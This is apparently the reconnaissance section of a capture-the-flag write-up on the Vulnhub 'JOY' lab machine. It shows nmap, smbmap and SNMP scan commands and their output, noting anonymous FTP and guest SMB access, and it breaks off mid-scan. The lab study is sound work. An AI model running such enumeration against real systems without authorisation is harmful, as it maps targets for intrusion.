---
title: Vulnhub - Digitalworld.local (JOY)
categories: [Vulnhub, Linux]
date: 2022-02-11 
tags: [tcp/22-ftp/exploit,  linux-priv-esc/linux-creds-found, linux-priv-esc/sudo/unknown-exec]
img_path: /Writeups/Vulnhub/Linux/Digitalworld.local (JOY)/images/
image:
  src: Pasted%20image%2020220208040124.png
  width: 1000   # in pixels
  height: 400   # in pixels
---

# Recon
## NMAP Complete Scan
``` 
# Nmap 7.92 scan initiated Fri Feb 11 18:02:47 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/vulnHub/Digitalworld.local-JOY/192.168.110.26/scans/_full_tcp_nmap.txt -oX /root/vulnHub/Digitalworld.local-JOY/192.168.110.26/scans/xml/_full_tcp_nmap.xml 192.168.110.26
Nmap scan report for 192.168.110.26
Host is up, received arp-response (0.00040s latency).
Scanned at 2022-02-11 18:02:48 +08 for 63s
Not shown: 65523 closed tcp ports (reset)
PORT    STATE SERVICE     REASON         VERSION
21/tcp  open  ftp         syn-ack ttl 64 ProFTPD 1.2.10
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxr-x   2 ftp      ftp          4096 Jan  6  2019 download
| -rw-r--r--   1 ftp      ftp           563 Feb 11 17:41 id_rsa.pub
|_drwxrwxr-x   2 ftp      ftp          4096 Jan 10  2019 upload
22/tcp  open  ssh         syn-ack ttl 64 Dropbear sshd 0.34 (protocol 2.0)
25/tcp  open  smtp        syn-ack ttl 64 Postfix smtpd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=JOY
| Subject Alternative Name: DNS:JOY
| Issuer: commonName=JOY
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-12-23T14:29:24
| Not valid after:  2028-12-20T14:29:24
| MD5:   9a80 5234 0ef3 1fdd 8f77 16fe 09ee 5b7b
| SHA-1: 4f02 9a1c 1f41 2ec9 c0df 4523 b1f4 a480 25f9 0165
| -----BEGIN CERTIFICATE-----
| MIICvDCCAaSgAwIBAgIJAOB9FmtuDenTMA0GCSqGSIb3DQEBCwUAMA4xDDAKBgNV
| BAMMA0pPWTAeFw0xODEyMjMxNDI5MjRaFw0yODEyMjAxNDI5MjRaMA4xDDAKBgNV
| BAMMA0pPWTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMKCCTsg68Xt
| Voexi0RYRs0lVeJTsKFffjgkLN5obSRTZOxM1M37pvs5+mBgNlgFy6loMbjUbgn8
| zlri4m/X6kTWGWrUDUr6QmqtndBRzZZAF+74LAmVIOekuFWWjgH1bhHAVq7rQhJ+
| IhRnEE6N5IdVzSjbrVpLNacYMHMSXOlJ0DeRThF4YgpNQBD8GfDUqKDLxX7wg9M+
| vAk4UwJ9l16zb5+mhyuOEAesCcdEXCBmxsMN1B8wGR2BlzLFXsTYHcEqcnNBN2aU
| Jw0YTqi/2a7GOBIVY5v2LmnO4TTQuEZ6j/a2zAt58dvIaRdCcwlmzVaQ/QdhSLpl
| v9Yvg8Fo/YsCAwEAAaMdMBswCQYDVR0TBAIwADAOBgNVHREEBzAFggNKT1kwDQYJ
| KoZIhvcNAQELBQADggEBAA4HnoLSM97sTHyvzxGXfjrWhfrPM18Qzh+iVL46XMjc
| YkZnAiyeU2FlY4xxlVjah+eb1pdNLYymbDdisv6HIkA7dfnf6jWBD2YxYSHhLfS7
| dwLklgMLeoVNI3EjjkWGiIlfDRXwkwD8GglotAlAgFsBr4SKtnI3vEp6nrlfjj6y
| VAxSZm3Q9z3Pm9WUZ8S6wV3MnoT5HTnRivt38Kbd1x24Bn1RsyrPIjHVteWZ+9vw
| wX+4SmJ9suq568berTNJ3kv3kO0NSJO4O4z6QelwQB14lflbBMJATxCBDyIUtyow
| x9Vlo8bbytCdNblSAjyxriZp1lZPmLOSe0D1YgpZWDQ=
|_-----END CERTIFICATE-----
|_smtp-commands: JOY.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
80/tcp  open  http        syn-ack ttl 64 Apache httpd 2.4.25
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2016-07-19 20:03  ossec/
|_
|_http-title: Index of /
|_http-server-header: Apache/2.4.25 (Debian)
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
110/tcp open  pop3        syn-ack ttl 64 Dovecot pop3d
| ssl-cert: Subject: commonName=JOY/organizationName=Good Tech Pte. Ltd/stateOrProvinceName=Singapore/countryName=SG/localityName=Singapore/emailAddress=joy@goodtech.com.sg/organizationalUnitName=JOY
| Issuer: commonName=JOY/organizationName=Good Tech Pte. Ltd/stateOrProvinceName=Singapore/countryName=SG/localityName=Singapore/emailAddress=joy@goodtech.com.sg/organizationalUnitName=JOY
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-01-27T17:23:23
| Not valid after:  2032-10-05T17:23:23
| MD5:   c8f9 a1cb ac3b baa1 f158 2916 d7bd d3b0
| SHA-1: 5df6 1fce d31e e8c4 9bd9 b5b7 27fa 4f28 cfb9 34c6
| -----BEGIN CERTIFICATE-----
| MIIDojCCAooCCQC7ojISCyumxzANBgkqhkiG9w0BAQsFADCBkjELMAkGA1UEBhMC
| U0cxEjAQBgNVBAgMCVNpbmdhcG9yZTESMBAGA1UEBwwJU2luZ2Fwb3JlMRswGQYD
| VQQKDBJHb29kIFRlY2ggUHRlLiBMdGQxDDAKBgNVBAsMA0pPWTEMMAoGA1UEAwwD
| Sk9ZMSIwIAYJKoZIhvcNAQkBFhNqb3lAZ29vZHRlY2guY29tLnNnMB4XDTE5MDEy
| NzE3MjMyM1oXDTMyMTAwNTE3MjMyM1owgZIxCzAJBgNVBAYTAlNHMRIwEAYDVQQI
| DAlTaW5nYXBvcmUxEjAQBgNVBAcMCVNpbmdhcG9yZTEbMBkGA1UECgwSR29vZCBU
| ZWNoIFB0ZS4gTHRkMQwwCgYDVQQLDANKT1kxDDAKBgNVBAMMA0pPWTEiMCAGCSqG
| SIb3DQEJARYTam95QGdvb2R0ZWNoLmNvbS5zZzCCASIwDQYJKoZIhvcNAQEBBQAD
| ggEPADCCAQoCggEBAMEcXK/3Zc9eUCY4cDXvNr/889t18fwSawRBdlHjTfADAnbI
| 3B9zux9T0ICw5RT2B/pNx229itUwI723YIPSsQKCWVeCSwamZuTdkHqSOIgqd64r
| 0VjiGp265B9ybChpZkMgftJjvnHaUNXhPnDOsIWwp0WKeoz6fd6hF817Loh2r8IK
| x0brpFezr/lUZQiJqSMNeYRVZxzJ4jHJqq0OWfh4DVTJuQAQ6uyUV1Sgz1637izt
| 5pNdYZw9DBK4LjuP+s0iC6oz76MgSs+mtEFfc0D59KtyJEte4HWqhKsMGvHzmvQl
| JchLaDsGkBQ0xaiCaWveA8AxW59wcXC1tUGXJAkCAwEAATANBgkqhkiG9w0BAQsF
| AAOCAQEAb8TK96b4AHhyrrhiFZDkEgSzU6W0p8t5UQbYrwx/g7oRtT78N6wD4rsA
| t+1qfaWCTL5KJ7kLrVnAnCdcZow90FrmIdsr3dib/4IKKNueiidXb0HD2/2FXCIw
| +b0QABRlw1WZEX1DiJDIj8nuI0CtuL3mRmWcbw6P4EwvwoMlQTc9aQ1goASpmVTN
| 1uZLCs1Kz8XIXJueyU0lsYsXumqvdaBIkcOwiIFB3wAaK6+TB+9m91GpNFR41fiH
| yHD2de8hnao+fiYSE416zQHTZgG7zDHpvH6OrO+TLLdEWtEvYo9xV9oirLcro+Wj
| p6Rjq4nlJrAyLA9BXP/I2xDPquktJA==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: AUTH-RESP-CODE SASL STLS PIPELINING RESP-CODES TOP UIDL CAPA
139/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        syn-ack ttl 64 Dovecot imapd
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: ID OK post-login LOGINDISABLEDA0001 STARTTLS more Pre-login ENABLE capabilities listed have LOGIN-REFERRALS SASL-IR IMAP4rev1 LITERAL+ IDLE
| ssl-cert: Subject: commonName=JOY/organizationName=Good Tech Pte. Ltd/stateOrProvinceName=Singapore/countryName=SG/localityName=Singapore/emailAddress=joy@goodtech.com.sg/organizationalUnitName=JOY
| Issuer: commonName=JOY/organizationName=Good Tech Pte. Ltd/stateOrProvinceName=Singapore/countryName=SG/localityName=Singapore/emailAddress=joy@goodtech.com.sg/organizationalUnitName=JOY
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-01-27T17:23:23
| Not valid after:  2032-10-05T17:23:23
| MD5:   c8f9 a1cb ac3b baa1 f158 2916 d7bd d3b0
| SHA-1: 5df6 1fce d31e e8c4 9bd9 b5b7 27fa 4f28 cfb9 34c6
| -----BEGIN CERTIFICATE-----
| MIIDojCCAooCCQC7ojISCyumxzANBgkqhkiG9w0BAQsFADCBkjELMAkGA1UEBhMC
| U0cxEjAQBgNVBAgMCVNpbmdhcG9yZTESMBAGA1UEBwwJU2luZ2Fwb3JlMRswGQYD
| VQQKDBJHb29kIFRlY2ggUHRlLiBMdGQxDDAKBgNVBAsMA0pPWTEMMAoGA1UEAwwD
| Sk9ZMSIwIAYJKoZIhvcNAQkBFhNqb3lAZ29vZHRlY2guY29tLnNnMB4XDTE5MDEy
| NzE3MjMyM1oXDTMyMTAwNTE3MjMyM1owgZIxCzAJBgNVBAYTAlNHMRIwEAYDVQQI
| DAlTaW5nYXBvcmUxEjAQBgNVBAcMCVNpbmdhcG9yZTEbMBkGA1UECgwSR29vZCBU
| ZWNoIFB0ZS4gTHRkMQwwCgYDVQQLDANKT1kxDDAKBgNVBAMMA0pPWTEiMCAGCSqG
| SIb3DQEJARYTam95QGdvb2R0ZWNoLmNvbS5zZzCCASIwDQYJKoZIhvcNAQEBBQAD
| ggEPADCCAQoCggEBAMEcXK/3Zc9eUCY4cDXvNr/889t18fwSawRBdlHjTfADAnbI
| 3B9zux9T0ICw5RT2B/pNx229itUwI723YIPSsQKCWVeCSwamZuTdkHqSOIgqd64r
| 0VjiGp265B9ybChpZkMgftJjvnHaUNXhPnDOsIWwp0WKeoz6fd6hF817Loh2r8IK
| x0brpFezr/lUZQiJqSMNeYRVZxzJ4jHJqq0OWfh4DVTJuQAQ6uyUV1Sgz1637izt
| 5pNdYZw9DBK4LjuP+s0iC6oz76MgSs+mtEFfc0D59KtyJEte4HWqhKsMGvHzmvQl
| JchLaDsGkBQ0xaiCaWveA8AxW59wcXC1tUGXJAkCAwEAATANBgkqhkiG9w0BAQsF
| AAOCAQEAb8TK96b4AHhyrrhiFZDkEgSzU6W0p8t5UQbYrwx/g7oRtT78N6wD4rsA
| t+1qfaWCTL5KJ7kLrVnAnCdcZow90FrmIdsr3dib/4IKKNueiidXb0HD2/2FXCIw
| +b0QABRlw1WZEX1DiJDIj8nuI0CtuL3mRmWcbw6P4EwvwoMlQTc9aQ1goASpmVTN
| 1uZLCs1Kz8XIXJueyU0lsYsXumqvdaBIkcOwiIFB3wAaK6+TB+9m91GpNFR41fiH
| yHD2de8hnao+fiYSE416zQHTZgG7zDHpvH6OrO+TLLdEWtEvYo9xV9oirLcro+Wj
| p6Rjq4nlJrAyLA9BXP/I2xDPquktJA==
|_-----END CERTIFICATE-----
445/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4.5.12-Debian (workgroup: WORKGROUP)
465/tcp open  smtp        syn-ack ttl 64 Postfix smtpd
| ssl-cert: Subject: commonName=JOY
| Subject Alternative Name: DNS:JOY
| Issuer: commonName=JOY
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-12-23T14:29:24
| Not valid after:  2028-12-20T14:29:24
| MD5:   9a80 5234 0ef3 1fdd 8f77 16fe 09ee 5b7b
| SHA-1: 4f02 9a1c 1f41 2ec9 c0df 4523 b1f4 a480 25f9 0165
| -----BEGIN CERTIFICATE-----
| MIICvDCCAaSgAwIBAgIJAOB9FmtuDenTMA0GCSqGSIb3DQEBCwUAMA4xDDAKBgNV
| BAMMA0pPWTAeFw0xODEyMjMxNDI5MjRaFw0yODEyMjAxNDI5MjRaMA4xDDAKBgNV
| BAMMA0pPWTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMKCCTsg68Xt
| Voexi0RYRs0lVeJTsKFffjgkLN5obSRTZOxM1M37pvs5+mBgNlgFy6loMbjUbgn8
| zlri4m/X6kTWGWrUDUr6QmqtndBRzZZAF+74LAmVIOekuFWWjgH1bhHAVq7rQhJ+
| IhRnEE6N5IdVzSjbrVpLNacYMHMSXOlJ0DeRThF4YgpNQBD8GfDUqKDLxX7wg9M+
| vAk4UwJ9l16zb5+mhyuOEAesCcdEXCBmxsMN1B8wGR2BlzLFXsTYHcEqcnNBN2aU
| Jw0YTqi/2a7GOBIVY5v2LmnO4TTQuEZ6j/a2zAt58dvIaRdCcwlmzVaQ/QdhSLpl
| v9Yvg8Fo/YsCAwEAAaMdMBswCQYDVR0TBAIwADAOBgNVHREEBzAFggNKT1kwDQYJ
| KoZIhvcNAQELBQADggEBAA4HnoLSM97sTHyvzxGXfjrWhfrPM18Qzh+iVL46XMjc
| YkZnAiyeU2FlY4xxlVjah+eb1pdNLYymbDdisv6HIkA7dfnf6jWBD2YxYSHhLfS7
| dwLklgMLeoVNI3EjjkWGiIlfDRXwkwD8GglotAlAgFsBr4SKtnI3vEp6nrlfjj6y
| VAxSZm3Q9z3Pm9WUZ8S6wV3MnoT5HTnRivt38Kbd1x24Bn1RsyrPIjHVteWZ+9vw
| wX+4SmJ9suq568berTNJ3kv3kO0NSJO4O4z6QelwQB14lflbBMJATxCBDyIUtyow
| x9Vlo8bbytCdNblSAjyxriZp1lZPmLOSe0D1YgpZWDQ=
|_-----END CERTIFICATE-----
|_smtp-commands: JOY.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
|_ssl-date: TLS randomness does not represent time
587/tcp open  smtp        syn-ack ttl 64 Postfix smtpd
|_ssl-date: TLS randomness does not represent time
|_smtp-commands: JOY.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
| ssl-cert: Subject: commonName=JOY
| Subject Alternative Name: DNS:JOY
| Issuer: commonName=JOY
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-12-23T14:29:24
| Not valid after:  2028-12-20T14:29:24
| MD5:   9a80 5234 0ef3 1fdd 8f77 16fe 09ee 5b7b
| SHA-1: 4f02 9a1c 1f41 2ec9 c0df 4523 b1f4 a480 25f9 0165
| -----BEGIN CERTIFICATE-----
| MIICvDCCAaSgAwIBAgIJAOB9FmtuDenTMA0GCSqGSIb3DQEBCwUAMA4xDDAKBgNV
| BAMMA0pPWTAeFw0xODEyMjMxNDI5MjRaFw0yODEyMjAxNDI5MjRaMA4xDDAKBgNV
| BAMMA0pPWTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMKCCTsg68Xt
| Voexi0RYRs0lVeJTsKFffjgkLN5obSRTZOxM1M37pvs5+mBgNlgFy6loMbjUbgn8
| zlri4m/X6kTWGWrUDUr6QmqtndBRzZZAF+74LAmVIOekuFWWjgH1bhHAVq7rQhJ+
| IhRnEE6N5IdVzSjbrVpLNacYMHMSXOlJ0DeRThF4YgpNQBD8GfDUqKDLxX7wg9M+
| vAk4UwJ9l16zb5+mhyuOEAesCcdEXCBmxsMN1B8wGR2BlzLFXsTYHcEqcnNBN2aU
| Jw0YTqi/2a7GOBIVY5v2LmnO4TTQuEZ6j/a2zAt58dvIaRdCcwlmzVaQ/QdhSLpl
| v9Yvg8Fo/YsCAwEAAaMdMBswCQYDVR0TBAIwADAOBgNVHREEBzAFggNKT1kwDQYJ
| KoZIhvcNAQELBQADggEBAA4HnoLSM97sTHyvzxGXfjrWhfrPM18Qzh+iVL46XMjc
| YkZnAiyeU2FlY4xxlVjah+eb1pdNLYymbDdisv6HIkA7dfnf6jWBD2YxYSHhLfS7
| dwLklgMLeoVNI3EjjkWGiIlfDRXwkwD8GglotAlAgFsBr4SKtnI3vEp6nrlfjj6y
| VAxSZm3Q9z3Pm9WUZ8S6wV3MnoT5HTnRivt38Kbd1x24Bn1RsyrPIjHVteWZ+9vw
| wX+4SmJ9suq568berTNJ3kv3kO0NSJO4O4z6QelwQB14lflbBMJATxCBDyIUtyow
| x9Vlo8bbytCdNblSAjyxriZp1lZPmLOSe0D1YgpZWDQ=
|_-----END CERTIFICATE-----
993/tcp open  ssl/imap    syn-ack ttl 64 Dovecot imapd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=JOY/organizationName=Good Tech Pte. Ltd/stateOrProvinceName=Singapore/countryName=SG/localityName=Singapore/emailAddress=joy@goodtech.com.sg/organizationalUnitName=JOY
| Issuer: commonName=JOY/organizationName=Good Tech Pte. Ltd/stateOrProvinceName=Singapore/countryName=SG/localityName=Singapore/emailAddress=joy@goodtech.com.sg/organizationalUnitName=JOY
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-01-27T17:23:23
| Not valid after:  2032-10-05T17:23:23
| MD5:   c8f9 a1cb ac3b baa1 f158 2916 d7bd d3b0
| SHA-1: 5df6 1fce d31e e8c4 9bd9 b5b7 27fa 4f28 cfb9 34c6
| -----BEGIN CERTIFICATE-----
| MIIDojCCAooCCQC7ojISCyumxzANBgkqhkiG9w0BAQsFADCBkjELMAkGA1UEBhMC
| U0cxEjAQBgNVBAgMCVNpbmdhcG9yZTESMBAGA1UEBwwJU2luZ2Fwb3JlMRswGQYD
| VQQKDBJHb29kIFRlY2ggUHRlLiBMdGQxDDAKBgNVBAsMA0pPWTEMMAoGA1UEAwwD
| Sk9ZMSIwIAYJKoZIhvcNAQkBFhNqb3lAZ29vZHRlY2guY29tLnNnMB4XDTE5MDEy
| NzE3MjMyM1oXDTMyMTAwNTE3MjMyM1owgZIxCzAJBgNVBAYTAlNHMRIwEAYDVQQI
| DAlTaW5nYXBvcmUxEjAQBgNVBAcMCVNpbmdhcG9yZTEbMBkGA1UECgwSR29vZCBU
| ZWNoIFB0ZS4gTHRkMQwwCgYDVQQLDANKT1kxDDAKBgNVBAMMA0pPWTEiMCAGCSqG
| SIb3DQEJARYTam95QGdvb2R0ZWNoLmNvbS5zZzCCASIwDQYJKoZIhvcNAQEBBQAD
| ggEPADCCAQoCggEBAMEcXK/3Zc9eUCY4cDXvNr/889t18fwSawRBdlHjTfADAnbI
| 3B9zux9T0ICw5RT2B/pNx229itUwI723YIPSsQKCWVeCSwamZuTdkHqSOIgqd64r
| 0VjiGp265B9ybChpZkMgftJjvnHaUNXhPnDOsIWwp0WKeoz6fd6hF817Loh2r8IK
| x0brpFezr/lUZQiJqSMNeYRVZxzJ4jHJqq0OWfh4DVTJuQAQ6uyUV1Sgz1637izt
| 5pNdYZw9DBK4LjuP+s0iC6oz76MgSs+mtEFfc0D59KtyJEte4HWqhKsMGvHzmvQl
| JchLaDsGkBQ0xaiCaWveA8AxW59wcXC1tUGXJAkCAwEAATANBgkqhkiG9w0BAQsF
| AAOCAQEAb8TK96b4AHhyrrhiFZDkEgSzU6W0p8t5UQbYrwx/g7oRtT78N6wD4rsA
| t+1qfaWCTL5KJ7kLrVnAnCdcZow90FrmIdsr3dib/4IKKNueiidXb0HD2/2FXCIw
| +b0QABRlw1WZEX1DiJDIj8nuI0CtuL3mRmWcbw6P4EwvwoMlQTc9aQ1goASpmVTN
| 1uZLCs1Kz8XIXJueyU0lsYsXumqvdaBIkcOwiIFB3wAaK6+TB+9m91GpNFR41fiH
| yHD2de8hnao+fiYSE416zQHTZgG7zDHpvH6OrO+TLLdEWtEvYo9xV9oirLcro+Wj
| p6Rjq4nlJrAyLA9BXP/I2xDPquktJA==
|_-----END CERTIFICATE-----
|_imap-capabilities: ID OK post-login capabilities listed Pre-login ENABLE more LITERAL+ have LOGIN-REFERRALS SASL-IR IMAP4rev1 AUTH=PLAINA0001 IDLE
995/tcp open  ssl/pop3    syn-ack ttl 64 Dovecot pop3d
| ssl-cert: Subject: commonName=JOY/organizationName=Good Tech Pte. Ltd/stateOrProvinceName=Singapore/countryName=SG/localityName=Singapore/emailAddress=joy@goodtech.com.sg/organizationalUnitName=JOY
| Issuer: commonName=JOY/organizationName=Good Tech Pte. Ltd/stateOrProvinceName=Singapore/countryName=SG/localityName=Singapore/emailAddress=joy@goodtech.com.sg/organizationalUnitName=JOY
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-01-27T17:23:23
| Not valid after:  2032-10-05T17:23:23
| MD5:   c8f9 a1cb ac3b baa1 f158 2916 d7bd d3b0
| SHA-1: 5df6 1fce d31e e8c4 9bd9 b5b7 27fa 4f28 cfb9 34c6
| -----BEGIN CERTIFICATE-----
| MIIDojCCAooCCQC7ojISCyumxzANBgkqhkiG9w0BAQsFADCBkjELMAkGA1UEBhMC
| U0cxEjAQBgNVBAgMCVNpbmdhcG9yZTESMBAGA1UEBwwJU2luZ2Fwb3JlMRswGQYD
| VQQKDBJHb29kIFRlY2ggUHRlLiBMdGQxDDAKBgNVBAsMA0pPWTEMMAoGA1UEAwwD
| Sk9ZMSIwIAYJKoZIhvcNAQkBFhNqb3lAZ29vZHRlY2guY29tLnNnMB4XDTE5MDEy
| NzE3MjMyM1oXDTMyMTAwNTE3MjMyM1owgZIxCzAJBgNVBAYTAlNHMRIwEAYDVQQI
| DAlTaW5nYXBvcmUxEjAQBgNVBAcMCVNpbmdhcG9yZTEbMBkGA1UECgwSR29vZCBU
| ZWNoIFB0ZS4gTHRkMQwwCgYDVQQLDANKT1kxDDAKBgNVBAMMA0pPWTEiMCAGCSqG
| SIb3DQEJARYTam95QGdvb2R0ZWNoLmNvbS5zZzCCASIwDQYJKoZIhvcNAQEBBQAD
| ggEPADCCAQoCggEBAMEcXK/3Zc9eUCY4cDXvNr/889t18fwSawRBdlHjTfADAnbI
| 3B9zux9T0ICw5RT2B/pNx229itUwI723YIPSsQKCWVeCSwamZuTdkHqSOIgqd64r
| 0VjiGp265B9ybChpZkMgftJjvnHaUNXhPnDOsIWwp0WKeoz6fd6hF817Loh2r8IK
| x0brpFezr/lUZQiJqSMNeYRVZxzJ4jHJqq0OWfh4DVTJuQAQ6uyUV1Sgz1637izt
| 5pNdYZw9DBK4LjuP+s0iC6oz76MgSs+mtEFfc0D59KtyJEte4HWqhKsMGvHzmvQl
| JchLaDsGkBQ0xaiCaWveA8AxW59wcXC1tUGXJAkCAwEAATANBgkqhkiG9w0BAQsF
| AAOCAQEAb8TK96b4AHhyrrhiFZDkEgSzU6W0p8t5UQbYrwx/g7oRtT78N6wD4rsA
| t+1qfaWCTL5KJ7kLrVnAnCdcZow90FrmIdsr3dib/4IKKNueiidXb0HD2/2FXCIw
| +b0QABRlw1WZEX1DiJDIj8nuI0CtuL3mRmWcbw6P4EwvwoMlQTc9aQ1goASpmVTN
| 1uZLCs1Kz8XIXJueyU0lsYsXumqvdaBIkcOwiIFB3wAaK6+TB+9m91GpNFR41fiH
| yHD2de8hnao+fiYSE416zQHTZgG7zDHpvH6OrO+TLLdEWtEvYo9xV9oirLcro+Wj
| p6Rjq4nlJrAyLA9BXP/I2xDPquktJA==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: AUTH-RESP-CODE SASL(PLAIN) USER PIPELINING RESP-CODES TOP UIDL CAPA
MAC Address: 08:00:27:2E:3C:B7 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=2/11%OT=21%CT=1%CU=%PV=Y%DS=1%DC=D%G=N%M=080027%TM=620
OS:63487%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=8
OS:)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B
OS:4ST11NW7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120
OS:)ECN(R=Y%DF=Y%TG=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%TG=40%S=O%A=
OS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%
OS:Q=)T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%TG=40%W=0%
OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1
OS:(R=N)IE(R=Y%DFI=N%TG=40%CD=S)

Uptime guess: 0.108 days (since Fri Feb 11 15:28:04 2022)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Hosts: The,  JOY.localdomain, 127.0.1.1, JOY; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2022-02-11T18:03:03
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.5.12-Debian)
|   Computer name: joy
|   NetBIOS computer name: JOY\x00
|   Domain name: \x00
|   FQDN: joy
|_  System time: 2022-02-12T02:03:03+08:00
| nbstat: NetBIOS name: JOY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   JOY<00>              Flags: <unique><active>
|   JOY<03>              Flags: <unique><active>
|   JOY<20>              Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 34704/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 43248/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 58943/udp): CLEAN (Timeout)
|   Check 4 (port 30979/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 5h19m58s, deviation: 4h37m07s, median: 7h59m57s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

TRACEROUTE
HOP RTT     ADDRESS
1   0.40 ms 192.168.110.26

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Feb 11 18:03:51 2022 -- 1 IP address (1 host up) scanned in 64.45 seconds

```

## TCP/21 (FTP)

### NMAP 
``` 
┌──(root💀kali)-[~/vulnHub/Digitalworld.local-JOY]
└─# nmap $ip -p 21 -sV -sC
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxr-x   2 ftp      ftp          4096 Jan  6  2019 download
|_drwxrwxr-x   2 ftp      ftp          4096 Jan 10  2019 upload
MAC Address: 08:00:27:2E:3C:B7 (Oracle VirtualBox virtual NIC)
Service Info: Host: The
```
- `ProFTPD`

## TCP/80 (HTTP)
### FFUF
- No directories enumerated

## TCP/139,445 (SMB)
### SMBMap
```
┌──(root💀kali)-[~/vulnHub/Digitalworld.local-JOY/192.168.110.26]
└─# smbmap -H $ip -u '' -p ''
[+] Guest session   	IP: 192.168.110.26:445	Name: 192.168.110.26                                    
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	IPC$                                              	NO ACCESS	IPC Service (Samba 4.5.12-Debian)
```
- No accessible fileshare

## UDP/161 (SNMP)
### NMAP
```
┌──(root💀kali)-[~/vulnHub/Digitalworld.local-JOY/192.168.110.26/loot/ftp]
└─# nmap -vv --reason -Pn -T4 -sU -sV -p 161 "--script=banner,(snmp* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" $ip 
PORT    STATE SERVICE REASON              VERSION
161/udp open  snmp    udp-response ttl 64 SNMPv1 server; net-snmp SNMPv3 server (public)
|_snmp-win32-software: ERROR: Script execution failed (use -d to debug)
| snmp-interfaces: 
|   lo
|     IP address: 127.0.0.1  Netmask: 255.0.0.0
|     Type: softwareLoopback  Speed: 10 Mbps
|     Status: up
|     Traffic stats: 1.14 Mb sent, 1.14 Mb received
|   Intel Corporation 82545EM Gigabit Ethernet Controller (Copper)
|     IP address: 192.168.110.26  Netmask: 255.255.255.0
|     MAC address: 08:00:27:2e:3c:b7 (Oracle VirtualBox virtual NIC)
|     Type: ethernetCsmacd  Speed: 1 Gbps
|     Status: up
